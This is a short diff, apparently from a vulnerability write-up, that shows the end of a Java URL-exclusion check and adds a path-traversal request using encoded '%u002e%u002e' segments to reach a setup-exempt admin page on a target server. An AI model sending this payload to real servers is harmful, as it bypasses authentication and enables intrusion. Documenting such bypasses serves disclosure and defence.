@@ -46,3 +46,6 @@ public static boolean testURLPassesExclude(String url, String exclude) {
         return false;
     }
 ```
+```
+[Target IP]/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+```
